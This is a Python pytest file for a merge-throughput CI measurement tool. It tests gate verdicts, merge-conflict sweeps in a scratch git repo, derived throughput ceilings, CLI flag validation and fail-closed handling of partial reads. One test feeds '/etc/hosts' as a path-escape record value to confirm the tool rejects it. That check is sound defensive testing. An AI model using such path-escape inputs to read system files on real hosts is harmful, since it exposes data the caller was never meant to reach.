def test_main_gate_sentinel_shim_removed():
    assert run_check("main-gate", json={"main_gate": "GREEN"}) == 2
    assert run_check("main-gate", json={"mergify_mergeable": "MERGEABLE"},
                     strict=True) == 2


def test_verdict_from_check_runs_non_red_is_not_green():
    run = {"name": "x", "status": "completed", "conclusion": "cancelled",
           "details_url": "x/1", "workflow": "w"}
    assert mt.verdict_from_check_runs([run]) == "NON_RED"
    assert mt.main_gate([run]) == "NON_RED"


def test_merge_pages_object_and_list_streams():
    assert mt._merge_pages([["a"], ["b"]]) == ["a", "b"]
    # A differing scalar must not be silently clobbered by a later page.
    merged = mt._merge_pages([
        {"total_count": 100, "check_runs": [1]},
        {"total_count": 5, "check_runs": [2]},
    ])
    assert merged == {"total_count": 100, "check_runs": [1, 2]}
    assert mt._merge_pages([]) == []


def test_queue_eta_claimed_total_without_items_is_2():
    assert run_check("queue-eta", json={"total_count": 5000, "max_eta_minutes": 1},
                     max=120, min_depth=50) == 2


def test_gap_record_path_escape_is_2():
    p = _gap_payload()
    p["gap"]["terms"]["effective_parallel"]["record"] = "/etc/hosts"
    assert run_check("gap", json=p, max=2, require_fresh=True) == 2


def test_durations_map_three_way():
    ok = {"durations_map": {"age_days": 3, "sampled_keys": 15, "tolerance": 0.5},
          "diverged": [], "read_ok": True}
    assert run_check("durations-map", json=ok, max_age_days=14) == 0
    stale = {"durations_map": {"age_days": 30, "sampled_keys": 15, "tolerance": 0.5},
             "diverged": [], "read_ok": True}
    assert run_check("durations-map", json=stale, max_age_days=14) == 1
    diverged = {"durations_map": {"age_days": 3, "sampled_keys": 15, "tolerance": 0.5},
                "diverged": ["test_x.py"], "read_ok": True}
    assert run_check("durations-map", json=diverged, max_age_days=14) == 1
    assert run_check("durations-map", json={}) == 2


def test_durations_map_empty_projection_is_2():
    payload = {"durations_map": {"age_days": 1, "sampled_keys": 0, "tolerance": 0.5},
               "diverged": [], "read_ok": True}
    assert run_check("durations-map", json=payload, max_age_days=14) == 2


def test_durations_map_zero_byte_read_is_2():
    payload = {"durations_map": {"age_days": 1, "sampled_keys": 15, "tolerance": 0.5},
               "diverged": [], "read_ok": False}
    assert run_check("durations-map", json=payload, max_age_days=14) == 2


# ---------------------------------------------------------------------------
# --or-artifact: typed INTEGER ceiling, section-anchored, range-validated.
# ---------------------------------------------------------------------------

ARTIFACT = """\
# Measurements

## ceiling
ceiling_prs_per_day: 234
ceiling_source: effective_parallel,effective_batch,cycle_minutes
effective_parallel: 3
effective_batch: 2
cycle_minutes: 37

## other
ceiling_prs_per_day: 999
"""


def _artifact(tmp_path, text: str) -> str:
    p = tmp_path / "meas.md"
    p.write_text(text)
    return str(p)


def test_read_ok_zero_is_a_failed_read():
    payload = {"items": [{"number": i, "conflicting": False} for i in range(12)],
               "total_count": 12, "read_ok": 0}
    assert run_check("conflicts", json=payload, max=5) == 2


def test_conflicts_unprobed_branch_is_2():
    items = [{"number": i, "conflicting": False} for i in range(12)]
    # The production shape carries BOTH keys: conflicting False + unknown True.
    items[0] = {"number": 0, "branch": "b", "conflicting": False,
                "unknown": True}
    assert run_check("conflicts",
                     json={"items": items, "total_count": 12, "read_ok": True},
                     max=5) == 2


def test_conflicts_misshaped_item_is_2():
    """An item with no probe verdict is not "no conflict"."""
    items = [{"number": i} for i in range(12)]
    assert run_check("conflicts",
                     json={"items": items, "total_count": 12, "read_ok": True},
                     max=5) == 2


def test_conflicts_main_moved_is_2():
    payload = {"items": [{"number": i, "conflicting": False}
                          for i in range(12)],
               "total_count": 12, "read_ok": True, "main_moved": True}
    assert run_check("conflicts", json=payload, max=5) == 2


def _ceiling_payload(measured):
    terms = {
        "effective_parallel": {"value": 3, "source": "M3"},
        "effective_batch": {"value": 2, "source": "M5"},
        "cycle_minutes": {"value": 37, "source": "M2"},
    }
    return {"prs_per_day": measured, "gap": {"terms": terms}}


def test_or_artifact_accepts_typed_integer_ceiling(tmp_path):
    path = _artifact(tmp_path, ARTIFACT)
    assert run_check("prs-per-day", json=_ceiling_payload(100), min=200,
                     or_artifact=f"{path}#ceiling") == 0


def test_or_artifact_without_emitted_terms_is_2(tmp_path):
    # A self-set integer is not a derived ceiling.
    path = _artifact(tmp_path, ARTIFACT)
    assert run_check("prs-per-day", json={"prs_per_day": 100}, min=200,
                     or_artifact=f"{path}#ceiling") == 2


def test_or_artifact_unmeasured_is_2(tmp_path):
    path = _artifact(tmp_path, ARTIFACT)
    assert run_check("prs-per-day", json={}, min=200,
                     or_artifact=f"{path}#ceiling") == 2


def test_or_artifact_rejects_float(tmp_path):
    path = _artifact(tmp_path, ARTIFACT.replace("ceiling_prs_per_day: 234",
                                                "ceiling_prs_per_day: 234.5"))
    assert run_check("prs-per-day", json=_ceiling_payload(10), min=200,
                     or_artifact=f"{path}#ceiling") == 2


def test_or_artifact_rejects_duplicate_key(tmp_path):
    path = _artifact(tmp_path, "## ceiling\nceiling_prs_per_day: 234\n"
                               "ceiling_prs_per_day: 235\n"
                               "ceiling_source: effective_parallel,effective_batch,cycle_minutes\n")
    assert run_check("prs-per-day", json=_ceiling_payload(10), min=200,
                     or_artifact=f"{path}#ceiling") == 2


def test_or_artifact_rejects_key_outside_anchored_section(tmp_path):
    # The `## ceiling` section is empty; the key lives in another section.
    path = _artifact(tmp_path, "## ceiling\n\n## other\nceiling_prs_per_day: 234\n")
    assert run_check("prs-per-day", json=_ceiling_payload(10), min=200,
                     or_artifact=f"{path}#ceiling") == 2


def test_or_artifact_rejects_date_and_issue_number(tmp_path):
    for value in ("2026-10-01", "#5215"):
        text = f"## ceiling\nceiling_prs_per_day: {value}\n"
        path = _artifact(tmp_path, text)
        assert run_check("prs-per-day", json=_ceiling_payload(10), min=200,
                         or_artifact=f"{path}#ceiling") == 2, value


def test_or_artifact_out_of_range_is_2(tmp_path):
    path = _artifact(tmp_path, "## ceiling\nceiling_prs_per_day: 200001\n"
                               "ceiling_source: effective_parallel,effective_batch,cycle_minutes\n")
    assert run_check("prs-per-day", json=_ceiling_payload(10), min=200,
                     or_artifact=f"{path}#ceiling") == 2


def test_or_artifact_ceiling_must_be_derived(tmp_path):
    # ceiling != round(parallel * batch * 1440 / cycle_minutes) => 2
    text = ("## ceiling\nceiling_prs_per_day: 500\n"
            "ceiling_source: effective_parallel,effective_batch,cycle_minutes\n")
    path = _artifact(tmp_path, text)
    assert run_check("prs-per-day", json=_ceiling_payload(10), min=200,
                     or_artifact=f"{path}#ceiling") == 2


def test_or_artifact_derived_ceiling_reconciles(tmp_path):
    # round(3 * 2 * 1440 / 37) = 234
    text = ("## ceiling\nceiling_prs_per_day: 234\n"
            "ceiling_source: effective_parallel,effective_batch,cycle_minutes\n")
    path = _artifact(tmp_path, text)
    assert run_check("prs-per-day", json=_ceiling_payload(10), min=200,
                     or_artifact=f"{path}#ceiling") == 0


def test_or_artifact_missing_source_is_2(tmp_path):
    path = _artifact(tmp_path, "## ceiling\nceiling_prs_per_day: 234\n")
    assert run_check("prs-per-day", json=_ceiling_payload(10), min=200,
                     or_artifact=f"{path}#ceiling") == 2


def test_or_artifact_measured_exceeds_ceiling_is_1(tmp_path):
    # Below `--min`, so the ceiling branch decides; a derived ceiling of 1 is
    # exceeded by the measurement.
    text = ("## ceiling\nceiling_prs_per_day: 1\n"
            "ceiling_source: effective_parallel,effective_batch,cycle_minutes\n")
    payload = {"prs_per_day": 150, "gap": {"terms": {
        "effective_parallel": {"value": 1, "source": "M3"},
        "effective_batch": {"value": 1, "source": "M5"},
        "cycle_minutes": {"value": 1440, "source": "M2"}}}}
    assert run_check("prs-per-day", json=payload, min=200,
                     or_artifact=f"{_artifact(tmp_path, text)}#ceiling") == 1


# ---------------------------------------------------------------------------
# Partial pagination is unconditionally non-zero.
# ---------------------------------------------------------------------------

def test_partial_pagination_is_unconditional_nonzero():
    payload = {"items": [], "total_count": 0, "read_ok": True,
               "incomplete_results": True}
    assert run_check("conflicts", json=payload, max=5) == 2
    assert run_check("no-languish", json={**payload, "items": [], "total_count": 0},
                     exclude=[], require_complete=False) == 2


def test_conflicts_self_consistent_one_item_read_is_2():
    payload = {"items": [{"number": 1, "conflicting": False}],
               "total_count": 1, "read_ok": True}
    assert run_check("conflicts", json=payload, max=5) == 2


def test_min_population_can_only_raise_the_floor():
    payload = {"items": [{"number": i, "conflicting": False} for i in range(12)],
               "total_count": 12, "read_ok": True}
    assert run_check("conflicts", json=payload, max=5) == 0
    assert run_check("conflicts", json=payload, max=5, min_population=100) == 2


def test_unset_min_population_cannot_reinstate_zero():
    # --min-population '' must not lower the committed floor, nor may the floor
    # be bypassed by an empty read.
    payload = {"items": [{"number": i, "conflicting": False} for i in range(12)],
               "total_count": 12, "read_ok": True}
    assert run_check("conflicts", json=payload, max=5, min_population="") == 0
    empty = {"items": [], "total_count": 0, "read_ok": True}
    assert run_check("conflicts", json=empty, max=5, min_population="") == 2


def test_conflicts_three_way():
    clean = {"items": [{"number": i, "conflicting": False} for i in range(12)],
             "total_count": 12, "read_ok": True}
    dirty = {"total_count": 12, "read_ok": True,
             "items": [{"number": i, "conflicting": i < 7} for i in range(12)]}
    assert run_check("conflicts", json=clean, max=5) == 0
    assert run_check("conflicts", json=dirty, max=5) == 1
    assert run_check("conflicts", json={}) == 2


# ---------------------------------------------------------------------------
# Bounded merge-tree sweep.
# ---------------------------------------------------------------------------

def test_bounded_map_never_exceeds_the_bound():
    import threading
    import time as _time

    state = {"cur": 0, "max": 0}
    lock = threading.Lock()

    def work(item):
        with lock:
            state["cur"] += 1
            state["max"] = max(state["max"], state["cur"])
        _time.sleep(0.01)
        with lock:
            state["cur"] -= 1
        return item

    out = mt.bounded_map(work, list(range(9)), concurrency=3)
    assert out == list(range(9))
    assert state["max"] <= 3


def test_sweep_concurrency_validated_against_cpu(monkeypatch):
    # A bound above the hard ceiling is refused.
    monkeypatch.setenv("MERGE_THROUGHPUT_MAX_CONCURRENCY", "2")
    with pytest.raises(SystemExit):
        mt.validate_sweep_concurrency(99)


def test_merge_tree_conflict_on_missing_ref_is_unknown(tmp_path):
    repo = _scratch_repo(tmp_path)
    assert mt.merge_tree_conflict(repo, "origin/main", "origin/does-not-exist") == mt.UNKNOWN


def test_merge_tree_conflict_clean_is_false(tmp_path):
    repo = _scratch_repo(tmp_path)
    assert mt.merge_tree_conflict(repo, "origin/main", "origin/clean") is False


def test_merge_tree_conflict_detects_conflict(tmp_path):
    repo = _scratch_repo(tmp_path)
    assert mt.merge_tree_conflict(repo, "origin/main", "origin/conflicts") is True


def test_main_moved_between_fetch_and_sweep_is_unknown():
    assert mt.assert_main_unchanged("aaa", "bbb") is mt.UNKNOWN
    assert mt.assert_main_unchanged("aaa", "aaa") == "aaa"


def _scratch_repo(tmp_path: Path) -> Path:
    d = tmp_path / "scratch"
    d.mkdir()

    def run(*args):
        subprocess.run(args, cwd=d, check=True, capture_output=True)

    run("git", "init", "-q", "-b", "main")
    run("git", "config", "user.email", "t@t")
    run("git", "config", "user.name", "t")
    (d / "f.txt").write_text("base\n")
    run("git", "add", "f.txt")
    run("git", "commit", "-qm", "base")
    run("git", "update-ref", "refs/remotes/origin/main", "HEAD")
    # a diverging branch that changes the same line -> a real conflict
    run("git", "checkout", "-q", "-b", "conflicts")
    (d / "f.txt").write_text("branch-change\n")
    run("git", "commit", "-qam", "conflict")
    run("git", "update-ref", "refs/remotes/origin/conflicts", "HEAD")
    # main advances on the same line -> the two sides diverge
    run("git", "checkout", "-q", "main")
    (d / "f.txt").write_text("main-change\n")
    run("git", "commit", "-qam", "main change")
    run("git", "update-ref", "refs/remotes/origin/main", "HEAD")
    # a clean branch: appends an unrelated file
    run("git", "checkout", "-q", "-b", "clean")
    (d / "other.txt").write_text("x\n")
    run("git", "add", "other.txt")
    run("git", "commit", "-qm", "clean")
    run("git", "update-ref", "refs/remotes/origin/clean", "HEAD")
    run("git", "checkout", "-q", "main")
    return d


# ---------------------------------------------------------------------------
# Rail parity — a COMMITTED pin plus a live check when the rail is resolvable.
# ---------------------------------------------------------------------------

_RAIL_TOKENS_PATH = ROOT / "tests" / "fixtures" / "rail_surface_tokens.json"
_RAIL_TOKEN_SETS = (
    ("NON_RED_CONC", "NON_RED_CONCLUSIONS"),
    ("NON_RED_STATE", "NON_RED_STATES"),
    ("MEASURING_CONC", "MEASURING_CONCLUSIONS"),
    ("MEASURING_STATE", "MEASURING_STATES"),
    ("IN_FLIGHT_STATUS", "IN_FLIGHT_STATUSES"),
    ("NON_CODE_EVENTS", "NON_CODE_EVENTS"),
)


def test_surface_token_sets_match_the_committed_rail_record():
    """The instrument's token sets against the COMMITTED rail record.

    This half ALWAYS RUNS. `scripts/admin-merge.sh` is untracked in this repo,
    so a pin that reads only the live rail does not run on a CI runner — and
    the sets below are what the instrument treats as GREEN. A drift in any of
    them must break a test a runner actually executes.
    """
    record = _json.loads(_RAIL_TOKENS_PATH.read_text())
    for rail_name, py_name in _RAIL_TOKEN_SETS:
        assert set(record[rail_name]) == set(getattr(mt, py_name)), (
            f"{py_name} drifted from the committed rail record {rail_name}")


def test_rail_surface_token_sets_match():
    """The rail is AUTHORITATIVE for the check-surface rules (plan I6).

    SIX token sets drive its probe: the non-red allow-list and MEASURING
    predicate for EACH endpoint (check runs AND legacy statuses), the named
    in-flight statuses, and the non-code actions events (which the rail states
    as a `case` arm rather than a set). The instrument OBSERVES that rule, so
    each set is pinned here — a vendor adding a conclusion must break this test
    rather than silently widen what the instrument treats as green.

    Two halves, because they run in different places: the committed record
    above always runs, and THIS half additionally asserts the record still
    matches the live rail — so the record cannot itself go stale where the rail
    is readable.
    """
    candidates = []
    import os

    env = os.environ.get("AGENT_INFRA_PATH")
    if env:
        candidates.append(Path(env) / "scripts" / "admin-merge.sh")
    candidates.append(ROOT / "scripts" / "admin-merge.sh")
    read_any = False
    for path in candidates:
        try:
            if not path.is_file():
                continue
            body = path.read_text(errors="replace")
        except OSError:
            continue
        read_any = True
        found = {}
        for name, _py_name in _RAIL_TOKEN_SETS:
            match = re.search(rf"^{name}\s*=\s*\{{([^}}]*)\}}", body, re.M)
            if match:
                found[name] = set(re.findall(r'"([^"]+)"', match.group(1)))
        # The non-code events are a `case` ARM in the rail, not a set, so the
        # set-shaped regex above never sees them. Every matching arm is parsed
        # (a rail that splits `schedule|issues|issue_comment` into three arms is
        # read correctly), so an event REMOVED from the rail cannot stay exempt
        # here — a fail-open direction.
        arm_events = set()
        for arm in re.finditer(
                r"^\s*([a-z_]+(?:\|[a-z_]+)*)\)\s*noncode=1", body, re.M):
            arm_events |= set(arm.group(1).split("|"))
        if arm_events:
            found["NON_CODE_EVENTS"] = arm_events
        if found:
            # EVERY declared set must have been FOUND. A parser that silently
            # stops matching a set retires that pin — the failure mode is a
            # green test over an unverified set, so a missing name is loud.
            missing = {name for name, _py in _RAIL_TOKEN_SETS} - set(found)
            if missing:
                pytest.fail(f"rail readable but these token sets were not "
                            f"found: {sorted(missing)} — parity unverifiable")
            # The record must still describe the LIVE rail: otherwise the pin
            # above holds the instrument to a record that has itself gone stale.
            record = _json.loads(_RAIL_TOKENS_PATH.read_text())
            for rail_name, py_name in _RAIL_TOKEN_SETS:
                assert found[rail_name] == set(record[rail_name]), (
                    f"the committed rail record for {rail_name} no longer "
                    f"matches {path} — update the record and the instrument "
                    f"together, WITH the rail change")
                assert found[rail_name] == set(getattr(mt, py_name))
            return
    if read_any:
        pytest.fail("rail readable but its surface token sets were not found — "
                    "parity unverifiable")
    pytest.skip("agent-infra rail not resolvable on this host (operational "
                "check; the committed record above still pinned the sets)")


# ---------------------------------------------------------------------------
# CLI surface — the full declared grammar is parseable.
# ---------------------------------------------------------------------------

def _run_cli(*args):
    env = {**os.environ, "MERGE_THROUGHPUT_ALLOW_FIXTURE": "1"}
    return subprocess.run(
        [sys.executable, str(ROOT / "tools" / "merge_throughput.py"), *args],
        capture_output=True, text=True, cwd=str(ROOT), env=env)


def test_cli_json_emits_fields_without_threshold_judgement():
    out = _run_cli("--json", "--fixture", "empty")
    assert out.returncode == 0, out.stderr
    payload = _json.loads(out.stdout)
    assert payload["main_sha"] == mt.UNKNOWN
    assert "gap" in payload


def test_cli_check_unknown_input_exits_2():
    out = _run_cli("check", "conflicts", "--max", "5", "--fixture", "empty")
    assert out.returncode == 2, out.stdout + out.stderr


def test_cli_fixture_is_refused_without_the_test_optin():
    env = {k: v for k, v in os.environ.items()
           if k != "MERGE_THROUGHPUT_ALLOW_FIXTURE"}
    out = subprocess.run(
        [sys.executable, str(ROOT / "tools" / "merge_throughput.py"),
         "check", "gap", "--max", "2", "--fixture", "gap_ok"],
        capture_output=True, text=True, cwd=str(ROOT), env=env)
    assert out.returncode == 2


def test_cli_conjunct_mixed_miss_is_1():
    out = _run_cli("check", "gap", "--max", "2", "--fixture", "conjunct_mixed",
                   "--and", "fast-files-unclassified", "--max", "0")
    assert out.returncode == 1, out.stdout + out.stderr


def test_cli_conjunct_unknown_beats_miss():
    out = _run_cli("check", "gap", "--max", "2", "--fixture", "conjunct_unknown",
                   "--and", "fast-files-unclassified", "--max", "0")
    assert out.returncode == 2, out.stdout + out.stderr


def test_cli_json_check_name_maps_to_field():
    # fast-files-unclassified maps to an EMITTED field ([] under gap_ok); an
    # unmapped/path-only implementation returned "UNKNOWN".
    out = _run_cli("--json", "fast-files-unclassified", "--fixture", "gap_ok")
    assert out.returncode == 0, out.stderr
    assert _json.loads(out.stdout) == []


def test_cli_json_unmapped_check_name_exits_2():
    out = _run_cli("--json", "drain-rate", "--fixture", "empty")
    assert out.returncode == 2


def test_cli_exclude_unknown_key_is_2():
    out = _run_cli("check", "no-languish", "--exclude", "bogus", "--fixture", "empty")
    assert out.returncode == 2


def test_cli_sweep_concurrency_flag_exists():
    out = subprocess.run(
        [sys.executable, str(ROOT / "tools" / "merge_throughput.py"), "--help"],
        capture_output=True, text=True, cwd=str(ROOT))
    assert out.returncode == 0
    assert "--sweep-concurrency" in out.stdout


def test_cli_input_record_reaches_0_and_1(tmp_path):
    rec = tmp_path / "drain.json"
    rec.write_text(_json.dumps({"merges_per_hour": 12.5, "merges": 300,
                                "window_hours": 24, "verified_at": NOW}))
    good = _run_cli("check", "drain-rate", "--min", "12", "--input", str(rec),
                    "--require-fresh")
    assert good.returncode == 0, good.stdout + good.stderr
    rec.write_text(_json.dumps({"merges_per_hour": 2.0, "merges": 48,
                                "window_hours": 24, "verified_at": NOW}))
    miss = _run_cli("check", "drain-rate", "--min", "12", "--input", str(rec),
                    "--require-fresh")
    assert miss.returncode == 1, miss.stdout + miss.stderr


def test_cli_input_missing_file_is_2(tmp_path):
    out = _run_cli("check", "drain-rate", "--min", "12",
                   "--input", str(tmp_path / "nope.json"))
    assert out.returncode == 2


def test_cli_triage_fixture_row_shape():
    out = _run_cli("--triage", "--emit", "rows", "--fixture", "empty")
    assert out.returncode == 0, out.stderr
    rows = _json.loads(out.stdout)
    assert rows and set(rows[0]) == set(mt.TRIAGE_SCHEMA_KEYS)
    # Task 5 owns the taxonomy; the fixture row is a real first-match bucket.
    assert rows[0]["bucket"] == "eligible"
    assert rows[0]["hard_stop"] is False
    assert rows[0]["terminal_decision"] is False
    assert rows[0]["superseded_by"] == mt.UNKNOWN


def test_cli_json_missing_field_path_exits_2():
    out = _run_cli("--json", ".gap.nope.deep", "--fixture", "empty")
    assert out.returncode == 2


def test_cli_json_accepts_an_input_record(tmp_path):
    """`--json <path>` must be feedable a record (M1 reads `.gap`)."""
    rec = tmp_path / "gap.json"
    rec.write_text(_json.dumps({"gap": {"value": 1.5, "terms": {}}}))
    out = _run_cli("--json", ".gap.value", "--input", str(rec))
    assert out.returncode == 0, out.stderr
    assert _json.loads(out.stdout) == 1.5


def test_cli_json_unparsable_input_is_2(tmp_path):
    rec = tmp_path / "bad.json"
    rec.write_text("not json")
    out = _run_cli("--json", ".gap", "--input", str(rec))
    assert out.returncode == 2


def test_cli_json_bare_form_exits_0():
    out = _run_cli("--json", "--fixture", "empty")
    assert out.returncode == 0, out.stderr
    assert "gap" in _json.loads(out.stdout)


# ---------------------------------------------------------------------------
# Round-4 hardening: fail-closed on unvalidated flags and unobserved elements.
# ---------------------------------------------------------------------------

def test_cli_numeric_flags_reject_empty_and_garbage():
    for flag in ("--min-headroom", "--min-depth", "--pr", "--min-population"):
        empty = _run_cli("check", "capacity", flag, "")
        assert empty.returncode == 2, (flag, empty.stdout + empty.stderr)
        garbage = _run_cli("check", "capacity", flag, "abc")
        assert garbage.returncode == 2, (flag, garbage.stdout + garbage.stderr)


def test_cli_numeric_flag_may_not_swallow_the_next_flag():
    out = _run_cli("check", "capacity", "--min-headroom", "--require-fresh")
    assert out.returncode == 2


def test_cli_or_artifact_empty_is_2():
    out = _run_cli("check", "prs-per-day", "--min", "200", "--or-artifact", "")
    assert out.returncode == 2


def test_or_artifact_empty_string_is_2():
    assert run_check("prs-per-day", json={"prs_per_day": 250}, min=200,
                     or_artifact="") == 2


def test_non_finite_numbers_are_not_measurements():
    assert mt._is_num(float("inf")) is False
    assert mt._is_num(float("nan")) is False
    assert mt._as_number(float("inf")) is None
    assert mt._as_number("nan") is None
    assert run_check("prs-per-day", json={"prs_per_day": float("inf")},
                     min=200) == 2


def test_queue_eta_non_empty_population_without_etas_is_2():
    payload = {"items": [{"eta_minutes": "UNKNOWN"}], "total_count": 1,
               "read_ok": True, "max_eta_minutes": 60}
    assert run_check("queue-eta", json=payload, max=120, min_depth=1) == 2


def test_batch_size_self_set_max_without_events_is_2():
    payload = {"events": 5, "batch_sizes": [], "max_batch_size": 3,
               "verified_at": NOW}
    assert run_check("batch-size", json=payload, min=2, min_depth=1,
                     require_fresh=True) == 2


def test_gap_value_must_match_the_m3_record(gap_repo):
    p = _gap_payload()
    p["gap"]["terms"]["effective_parallel"]["value"] = 99
    assert run_check("gap", json=p, max=2, require_fresh=True) == 2


def test_gap_fewer_than_six_terms_is_2(gap_repo):
    p = _gap_payload()
    p["gap"]["terms"].pop("wait")
    assert run_check("gap", json=p, max=2, require_fresh=True) == 2


def test_gap_unknown_value_with_valid_terms_is_2(gap_repo):
    p = _gap_payload(2.0)
    p["gap"]["value"] = "UNKNOWN"
    assert run_check("gap", json=p, max=2, require_fresh=True) == 2


def test_no_languish_non_boolean_movement_is_2():
    payload = {"total_count": 12, "read_ok": True,
               "items": [{"number": i, "classification": "open",
                          "moved_in_window": "false"} for i in range(12)]}
    assert run_check("no-languish", json=payload, exclude=[],
                     require_complete=True) == 2


def test_no_languish_unset_superseded_by_keeps_the_row_active():
    items = [{"number": i, "classification": "open", "moved_in_window": False,
              "superseded_by": ""} for i in range(12)]
    payload = {"items": items, "total_count": 12, "read_ok": True,
               "window_days": 7}
    assert run_check("no-languish", json=payload, exclude=["superseded_by"],
                     require_complete=True) == 1


def test_attribution_backwards_clock_is_2():
    payload = {"pr": 5, "main_red": True, "verified_at": NOW,
               "red_first_observed": "2026-09-26T10:10:00Z",
               "attribution_recorded": "2026-09-26T10:00:00Z"}
    assert run_check("attribution", json=payload, pr=5, max=5) == 2


def test_parse_api_body_invalid_utf8_is_unknown():
    assert mt.parse_api_body(b"\xff\xfe\x00") is mt.UNKNOWN


def test_cli_json_parsable_non_dict_input_is_2(tmp_path):
    rec = tmp_path / "list.json"
    rec.write_text("[1, 2, 3]")
    out = _run_cli("--json", "--input", str(rec))
    assert out.returncode == 2


def test_or_artifact_plus_signed_integer_is_2(tmp_path):
    text = ARTIFACT.replace("ceiling_prs_per_day: 234",
                            "ceiling_prs_per_day: +234")
    path = _artifact(tmp_path, text)
    assert run_check("prs-per-day", json=_ceiling_payload(100), min=200,
                     or_artifact=f"{path}#ceiling") == 2


# ---------------------------------------------------------------------------
# Round-5 hardening: partial populations, per-field isolation, transport.
# ---------------------------------------------------------------------------

def test_queue_eta_partial_eta_population_is_2():
    payload = {"items": [{"eta_minutes": 10}, {"eta_minutes": "UNKNOWN"}],
               "total_count": 2, "read_ok": True, "max_eta_minutes": 10}
    assert run_check("queue-eta", json=payload, max=120, min_depth=1) == 2


def test_queue_eta_failed_or_incomplete_read_is_2():
    base = {"items": [{"eta_minutes": 10}], "total_count": 1}
    assert run_check("queue-eta", json={**base, "read_ok": False},
                     max=120, min_depth=1) == 2
    assert run_check("queue-eta", json={**base, "incomplete_results": True},
                     max=120, min_depth=1) == 2


def test_batch_size_partial_window_is_2():
    payload = {"events": 2, "batch_sizes": [2, "UNKNOWN"], "max_batch_size": 2,
               "verified_at": NOW}
    assert run_check("batch-size", json=payload, min=2, min_depth=1,
                     require_fresh=True) == 2


def test_batch_size_min_depth_floor_is_enforced():
    payload = {"events": 0, "batch_sizes": [2], "max_batch_size": 2,
               "verified_at": NOW}
    assert run_check("batch-size", json=payload, min=2, min_depth=5,
                     require_fresh=True) == 2


def test_capacity_negative_field_is_2():
    payload = {"queued": 1, "in_progress": 1, "oldest_minutes": -100,
               "capacity_at_first_failure": 8, "configured_max_parallel_checks": 5}
    assert run_check("capacity", json=payload, max_oldest_minutes=120) == 2


@pytest.mark.parametrize("field", [
    "queued", "in_progress", "oldest_minutes",
    "capacity_at_first_failure", "configured_max_parallel_checks",
])
def test_capacity_each_field_is_individually_required(field):
    payload = {"queued": 1, "in_progress": 1, "oldest_minutes": 60,
               "capacity_at_first_failure": 8, "configured_max_parallel_checks": 5}
    payload[field] = "UNKNOWN"
    assert run_check("capacity", json=payload, max_oldest_minutes=120) == 2


def test_capacity_fresh_field_set_is_pinned():
    assert set(mt._CAPACITY_FRESH_FIELDS) == {
        "queued", "in_progress", "oldest_minutes", "capacity_at_first_failure"}


def test_capacity_each_fresh_field_is_individually_required():
    for field in mt._CAPACITY_FRESH_FIELDS:
        payload = {"queued": 1, "in_progress": 1, "oldest_minutes": 60,
                   "capacity_at_first_failure": 8,
                   "configured_max_parallel_checks": 5,
                   "records": {f: {"verified_at": NOW}
                               for f in mt._CAPACITY_FRESH_FIELDS}}
        payload["records"][field] = {"verified_at": _iso(30)}
        assert run_check("capacity", json=payload, min_headroom=1,
                         require_fresh=True) == 2, field


def test_capacity_count_cannot_be_a_boolean():
    payload = {"queued": 1, "in_progress": 1, "oldest_minutes": 60,
               "capacity_at_first_failure": 8, "configured_max_parallel_checks": 5,
               "items": [{"id": 1}], "total_count": True}
    assert run_check("capacity", json=payload, require_complete=True) == 2


def test_no_languish_mistyped_exclusion_is_2():
    items = [{"number": i, "classification": "open", "moved_in_window": True}
             for i in range(11)]
    items.append({"number": 11, "moved_in_window": False, "draft": "false"})
    payload = {"items": items, "total_count": 12, "read_ok": True}
    assert run_check("no-languish", json=payload, exclude=["draft"],
                     require_complete=True) == 2


def test_main_gate_missing_total_count_is_2():
    payload = {"required": ["a"], "check_runs": [_gcheck("a", "success")]}
    assert run_check("main-gate", json=payload, strict=True) == 2


def test_merge_pages_scalar_passthrough():
    assert mt._merge_pages("scalar") == "scalar"


def test_gh_api_nonzero_exit_with_json_body_is_unknown(monkeypatch):
    monkeypatch.setattr(
        mt.subprocess, "run",
        lambda *a, **k: SimpleNamespace(returncode=1, stdout='{"a": 1}', stderr="x"))
    assert mt._gh_api("repos/o/r") is mt.UNKNOWN


def test_gh_api_retries_then_records_status(monkeypatch, capsys):
    calls = {"n": 0}

    def fake_run(cmd, **kwargs):
        calls["n"] += 1
        return SimpleNamespace(returncode=1, stdout="", stderr="boom")

    monkeypatch.setattr(mt.subprocess, "run", fake_run)
    assert mt._gh_api("repos/o/r") is mt.UNKNOWN
    assert calls["n"] == 3  # literal, not the constant under test
    assert "boom" in capsys.readouterr().err


def test_triage_rows_classifies_every_pr(monkeypatch):
    prs = [
        {"number": 1, "draft": False, "title": "a (#10)", "head": {"ref": "fix/10-a"}},
        {"number": 5136, "draft": True, "title": "h (#20)", "head": {"ref": "fix/20-h"}},
        {"number": 2, "draft": True, "title": "d (#30)", "head": {"ref": "fix/30-d"}},
    ]
    monkeypatch.setattr(mt, "_gh_api", lambda *a, **k: prs)
    monkeypatch.setattr(mt, "collect_triage_conflicts",
                        lambda *a, **k: {1: (False, []), 5136: (True, ["f"]),
                                         2: (True, ["g"])})
    monkeypatch.setattr(mt, "collect_triage_stale_surface",
                        lambda *a, **k: {1: FRESH_EVIDENCE, 5136: FRESH_EVIDENCE,
                                         2: FRESH_EVIDENCE})
    monkeypatch.setattr(mt, "open_pr_total", lambda: 3)
    monkeypatch.setattr(mt, "load_triage_owner_evidence", lambda *a, **k: {})
    rows, total = mt._triage_rows()
    assert total == 3
    assert [r["bucket"] for r in rows] == ["eligible", "hard_stop", "draft"]
    assert rows[0]["conflicted_paths"] == []
    assert rows[1]["conflicted_paths"] == ["f"]
    assert rows[2]["conflict"] is True
    assert rows[0]["owner"] == mt.UNKNOWN      # no evidence -> UNKNOWN
    assert rows[0]["owning_issue"] == "10"


def test_cli_numeric_flag_cannot_disarm_a_gate(tmp_path):
    rec = tmp_path / "cap.json"
    rec.write_text(_json.dumps({
        "queued": 1, "in_progress": 1, "oldest_minutes": 60,
        "capacity_at_first_failure": 5, "configured_max_parallel_checks": 5}))
    out = _run_cli("check", "capacity", "--max-oldest-minutes", "120",
                   "--min-headroom", "abc", "--input", str(rec))
    assert out.returncode == 2, out.stdout + out.stderr


def test_cli_numeric_flag_error_names_the_flag():
    out = _run_cli("check", "capacity", "--min-headroom", "abc")
    assert out.returncode == 2
    assert "--min-headroom" in out.stderr


# ---------------------------------------------------------------------------
# Round-6 hardening: sentinels, negative arms, tolerance pinning, live reader.
# ---------------------------------------------------------------------------

def test_read_ok_sentinel_is_not_a_successful_read():
    base = {"items": [{"conflicting": False}] * 12, "total_count": 12}
    assert run_check("conflicts", json={**base, "read_ok": "UNKNOWN"}, max=5) == 2
    assert run_check("conflicts", json={**base, "read_ok": 1}, max=5) == 2
